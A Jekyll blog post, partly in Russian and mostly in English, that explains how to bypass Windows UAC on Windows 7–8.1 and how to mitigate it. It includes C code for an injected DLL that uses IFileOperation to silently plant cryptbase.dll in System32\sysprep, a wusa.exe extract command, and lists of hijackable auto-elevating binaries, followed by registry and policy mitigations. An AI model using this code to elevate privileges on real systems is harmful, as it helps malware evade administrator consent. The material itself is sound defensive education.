---
title: Обход Windows контроля учетных записей (UAC) и методы смягчения
layout: post
categories: articles
tags:
  - articles_rus
  - windows
published: true
---

# Оглавление
{:.no_toc}

* toc
{:toc}


# Введение

Защита компьютеров от злоупотреблений в корпоративной среде всегда была непрерывным процессом. Предоставление прав администратора пользователям всегда злоупотреблялось и пользователи устанавливали неутвержденное программное обеспечение, изменяли конфигурации и тд. Не предоставляй права локального администратора и они утверждают, что не могут выполнять свою работу. Если малварь скомпрометировала машину с полными правами администратора, то вы, скорее всего, попытаетесь переоборудовать ее.

Контроль учетных записей (UAC) дает нам возможность работать со стандартными правами пользователя вместо полных прав администратора. Таким образом, даже если ваша стандартная учетная запись находится в группе локальных администраторов, ущерб ограничен. То есть установка служб, драйверов, запись в безопасные места и тд запрещены. Для выполнения этих действий пользователям потребуется взаимодействовать с рабочим столом, например, щелкнув правой кнопкой мыши и запустив их с правами администратора, или принять запрос на повышение прав от UAC. UAC был представлен начиная с Windows Vista и содержит ряд технологий включая виртуализацию файловой системы и реестра, учетную запись защищенного администратора (PA или Protected Administrator), запросы на повышение прав UAC и уровни целостности Windows.

UAC работает регулируя уровень разрешений нашей учетной записи, поэтому действия программ выполняются из под обычного пользователя, даже если у нас есть права локального администратора на компьютере. Когда будут внесены изменения требующие разрешения на уровне администратора, UAC уведомит нас. Если у нас есть права локального администратора, мы можем нажать «Да», чтобы продолжить, в противном случае нам будет предложено ввести пароль администратора. Однако это будет зависеть от того, какие политики были определены в вашей среде.

В этой статье показано, как легко можно обойти запросы на повышение прав UAC и какие действия можно предпринять для уменьшения этой угрозы.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/regedituac.png){:class="imghalf"}

# Обход UAC

Эксплуатация UAC является тривиальным процессом. Есть два этапа которые необходимо пройти для достижения обхода, чтобы подняться от стандартных прав пользователя до прав администратора. Эти шаги широко опубликованы, так что в этом нет ничего нового, хотя на этапе 2 документированы еще некоторые уязвимости связанные с захватом (hijacking) DLL.


   >Запить в безопасное место
    Эксплуатация DLL hijacking уязвимости

Для того чтобы наш обход был успешным, мы должны начать с:

   >Процесс средней целостности
    Стандартный пользователь в группе администраторов
    Исполняемый файл Windows который должен быть подписан сертификатом подписи кода Microsoft
    Исполняемый файл Windows должен находиться в безопасном каталоге
    Исполняемый файл Windows также должен указывать свойство автоматического поднятия прав (Elevate) в своем манифесте.

# Запись в безопасное место
Есть несколько способов, которыми мы можем записать в безопасное место.

   >Использовать IFileOperation COM Object
    Использование автономного установщика Центра обновления Windows (Windows Update Standalone Installer/wusa.exe)

# IFileOperation COM Object
The IFileOperation COM object has a method that we can use to copy files to our secure location as the operation will auto-elevate and able to do a privilege copy. To exploit we can in inject our malicious DLL in a medium integrity process to carry out the operation. Since the COM object is set to auto-elevate the injected process does not need to be marked for auto-elevation in its manifest.

On windows 7 injected processes that have copied successfully are

~~~
C:\Windows\explorer.exe
C:\Windows\System32\wuauclt.exe
C:\Windows\System32\taskhost.exe
~~~

During tests taskhost.exe only happens to work once after boot and wuauclt.exe doesn’t always work which leaves explorer.exe is only the reliable process to use.

On Windows 8 injected processes that have copied successfully are

~~~
C:\Windows\explorer.exe
C:\Windows\System32\wuauclt.exe
C:\Windows\System32\RuntimeBroker.exe
~~~


Again explorer.exe is only the reliable process to use I found during my tests and the only one that worked on Windows 8.1

The main part of the code below has been taken from MSDN with just the some minor changes. The SetOperationFlags values used was taken from the UAC bypass code published [here](https://download.pureftpd.org/pub/misc/UAC.cpp ).

~~~
#include <stdio.h>
#include <Shobjidl.h>
#include <Windows.h>

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "shell32.lib")

int WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
FileOperation  *pfo;
IShellItem      *psiFrom = NULL;
IShellItem      *psiTo = NULL;
LPCWSTR pszSrcItem = L"calc.dll";
LPCWSTR pszNewName = L"cryptbase.dll";
LPCWSTR pszDest    = L"C:\\windows\\System32\\sysprep";

HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
if (SUCCEEDED(hr))
{
 hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pfo));
 if (SUCCEEDED(hr))
 {
 hr = pfo->SetOperationFlags( FOF_NOCONFIRMATION |
 FOF_SILENT |
 FOFX_SHOWELEVATIONPROMPT |
 FOFX_NOCOPYHOOKS |
 FOFX_REQUIREELEVATION |
 FOF_NOERRORUI );
 if (SUCCEEDED(hr))
 {
 hr = SHCreateItemFromParsingName(pszSrcItem, NULL, IID_PPV_ARGS(&psiFrom));
 if (SUCCEEDED(hr))
 {
 if (NULL != pszDest)
 {
 hr = SHCreateItemFromParsingName(pszDest, NULL, IID_PPV_ARGS(&psiTo));
 }
 if (SUCCEEDED(hr))
 {
 hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);
 if (NULL != psiTo)
 {
 psiTo->Release();
 }
 }
 psiFrom->Release();
 }
 if (SUCCEEDED(hr))
 {
 hr = pfo->PerformOperations();
 }
 }
 pfo->Release();
 }
 CoUninitialize();
 }
 return 0;
}
~~~

# Windows Update Standalone Installer
Another method to use to copy to our secure location is using Windows Update Standalone Installer (wusa.exe). Wusa.exe when executed runs as a high integrity process as its set to auto-elevate in its manifest. For auto-elevation the Windows executable must be signed, located in a secure directory such as C:\Windows\System32 and must specify the autoElevate property in their manifest.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/wusaautoelevate.png){:class="imghalf"}

We use wusa.exe to extract a CAB file (cabinet archive file) to our secure location

	wusa c:\users\user1\desktop\poc.tmp /extract:c:\windows\system32\sysprep
    
# Exploiting DLL hijacking vulnerability
When exploiting a DLL hijacking vulnerability the executable we are going to run again has to be signed; located in a secure directory and must specify the autoElevate property in its manifest in order load as a high integrity process.


On Windows 7 there are three executables that could be exploited and associated DLLs listed below
~~~
C:\windows\ehome\Mcx2Prov.exe
C:\Windows\ehome\CRYPTBASE.dll

C:\windows\System32\sysprep\sysprep.exe
C:\Windows\System32\sysprep\CRYPTSP.dll
C:\windows\System32\sysprep\CRYPTBASE.dll
C:\Windows\System32\sysprep\RpcRtRemote.dll
C:\Windows\System32\sysprep\UxTheme.dll

C:\windows\System32\cliconfg.exe
C:\Windows\System32\NTWDBLIB.DLL
~~~

On malwr.com a malware submitted on 25th June last year had already been using Mcx2Prov.exe to bypass UAC and day later an exploit had also been [published](https://github.com/hzeroo/Carberp/blob/master/source%20-%20absource/pro/all%20source/BJWJ/source/exploit/UAC_bypass.cpp).

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/malwruac.png){:class="imghalf"}

The same hash had also been flagged on VirusTotal (38/54) submitted over four months ago.

On Windows 8 there are also three executables that could be exploited and associated DLLs listed below

~~~
C:\windows\System32\sysprep\sysprep.exe
C:\windows\System32\sysprep\CRYPTBASE.dll
C:\Windows\System32\Sysprep\dwmapi.dll
C:\Windows\System32\Sysprep\SHCORE.dll

C:\windows\System32\cliconfg.exe
C:\Windows\System32\NTWDBLIB.DLL

C:\windows\System32\pwcreator.exe
C:\Windows\System32\vds.exe
C:\Windows\System32\UReFS.DLL
~~~

Finally on Windows 8.1 there are also three executables that could be exploited and associated DLLs listed below

~~~
C:\windows\System32\sysprep\sysprep.exe
C:\Windows\System32\Sysprep\SHCORE.dll
C:\Windows\System32\Sysprep\OLEACC.DLL

C:\windows\System32\cliconfg.exe
C:\Windows\System32\NTWDBLIB.DLL

C:\windows\System32\pwcreator.exe
C:\Windows\System32\vds.exe
C:\Program Files\Common Files\microsoft shared\ink\CRYPTBASE.dll
C:\Program Files\Common Files\microsoft shared\ink\CRYPTSP.dll
C:\Program Files\Common Files\microsoft shared\ink\dwmapi.dll
C:\Program Files\Common Files\microsoft shared\ink\USERENV.dll
C:\Program Files\Common Files\microsoft shared\ink\OLEACC.dll
~~~

Calling pwcreator.exe (Create a Windows To Go workspace) executable calls vds.exe (Virtual Disk Service) which then loads our DLL and gives us System integrity running in SYSTEM account.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/proexpvds.png){:class="imghalf"}

Calling these executables sysprep.exe, cliconfg.exe and pwcreater.exe does produce a GUI window but should be able to easily make it run in the background and then terminated after being exploited. This is something I haven’t looked into so I’ll leave upto you.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/sysprep.png){:class="imghalf"}
![1]({{ site.baseurl }}/assets/img/posts/bypass uac/cliconfg.png){:class="imghalf"}
![1]({{ site.baseurl }}/assets/img/posts/bypass uac/pwcreator.png){:class="imghalf"}

# Mitigation
The best way to mitigate this bypass is just by not giving users local admin rights to their machines. Majority of user accounts in a corporate environment you should be able to do this reducing the attack surface. This however does not apply home users which would have local admin rights by default.

The actual bypass only works when set to the middle two UAC settings which will let it auto-elevate. To see your settings you need to go to Control Panel – User Accounts – Change User Account Control settings.

>Notify me only when apps try to make changes to my computer (default)
Notify me only when apps try to make changes to my computer (do not dim desktop settings)

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/uacsettings.png){:class="imghalf"}

so we could set to Always notify but this would bring it back to like it was on Windows Vista with constant notifications and not really practical and the user would end up setting it to Never notify which is definitely not a good idea.

Microsoft has given us 10 UAC policies to play with so it’s worth spending some time understanding and testing these out before implementing it in your own domain environment. To see what is applied on your local machine type secpol.msc into Start-Run to open the Local Security Policy snap-in and expand the Local Policies-Security Options folder. Run rsop.msc to view group policies applied on machines in a domain environment.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/secpol.png){:class="imghalf"}

Looking in the registry these are the default values of UAC

~~~
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
"ConsentPromptBehaviorAdmin"=dword:00000005
"ConsentPromptBehaviorUser"=dword:00000003
"EnableInstallerDetection"=dword:00000001
"EnableLUA"=dword:00000001
"EnableSecureUIAPaths"=dword:00000001
"EnableUIADesktopToggle"=dword:00000000
"EnableVirtualization"=dword:00000001
"FilterAdministratorToken"=dword:00000000
"PromptOnSecureDesktop"=dword:00000001
"ValidateAdminCodeSignatures"=dword:00000000
~~~

When the slider is moved upto “Always notify me” it changes this value
~~~
"ConsentPromptBehaviorAdmin"=dword:00000002
~~~

When the slider is moved down to “Notify me only when apps try to make changes to my computer (do not dim desktop settings)” it changes this value

	"PromptOnSecureDesktop"=dword:00000000
    
And when the slider is moved to “Never notify” the values changed are

~~~
"ConsentPromptBehaviorAdmin"=dword:00000000
"EnableLUA"=dword:00000000
"PromptOnSecureDesktop"=dword:00000000
~~~

Take note that EnableLUA has been disabled completely. This is an extremely dangerous value to be in and should never be disabled so its strongly recommend to set this settings to be enabled in group policies so it always gets applied if settings are reset/changed by users or by previously removed malware.

# User Account Control: Run all administrators in Admin Approval Mode

Once disabled not only a malicious process could be able to go straight to high integrity without any bypass but also Internet Explorer would run in medium integrity. UAC gives us the Protected Mode (sandbox) in Internet Explorer providing added security. Internet Explorer normally runs in low integrity child process so if compromised by some IE exploit the damage is minimized as in low integrity there are only a handful of locations it can be written to on the system.

These changes mentioned above have been seen on Windows 7. On Windows 8/8.1 EnableLUA does not change to disabled. So when the slider is moved to Never notify the values changed are only

~~~
"ConsentPromptBehaviorAdmin"=dword:00000000
"PromptOnSecureDesktop"=dword:00000000
~~~

Since value “EnableLUA”=dword:00000001 does not change, UAC is not completely disabled and Internet Explorer would still run in low integrity.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/iew8low.png){:class="imghalf"}

If however a user logged onto a machine using the local admin account (administrator or whatever renamed on your corporate build) UAC settings does not apply as all processes run in high integrity. This applies to Windows 7/8 and 8.1 so always make sure users DO NOT logon using local admin account, if local admin rights are required better add their domain account to the local administrators group.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/compmanuac.png){:class="imghalf"}
![1]({{ site.baseurl }}/assets/img/posts/bypass uac/iew8high.png){:class="imghalf"}

If for whatever reason logging on using the local admin account is a necessity then best set this UAC policy to enabled.

User Account Control: Admin Approval Mode for the built-in Administrator account
“FilterAdministratorToken”=dword:00000001

Another option would be to look into renaming or deleting the executables Mcx2Prov.exe, sysprep.exe, cliconfg.exe and pwcreator.exe if definitely not required on the system so the second stage to exploit DLL hijacking fails.

Finally if users do require local admin privileges then worth setting their machine UAC policy to Always notify and they live with the constant notifications.

User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode (2-Prompt for consent on the secure desktop)

# Conclusion
This bypass only works when all of the requirements are available to abuse. Remove one requirement and the bypass will fail. Office documents are opened in medium integrity so these are ideal targets to abuse the UAC bypass. Since these bypasses are so effortlessly achieved the only real course of action would be to set UAC to “Always notify” or remove local admin rights for the user. In the end using agents like Microsoft EMET or MalwareBytes Anti-Exploit would be the best mitigating action to take from initially being exploited in the first place.


# References
http://technet.microsoft.com/en-us/magazine/2009.07.uac.aspx
http://technet.microsoft.com/en-us/magazine/2007.06.uac.aspx
http://windows.microsoft.com/en-gb/windows/what-is-user-account-control#1TC=windows-7
http://windows.microsoft.com/en-gb/windows/what-are-user-account-control-settings#1TC=windows-7
http://blog.cobaltstrike.com/2014/03/20/user-account-control-what-penetration-testers-should-know
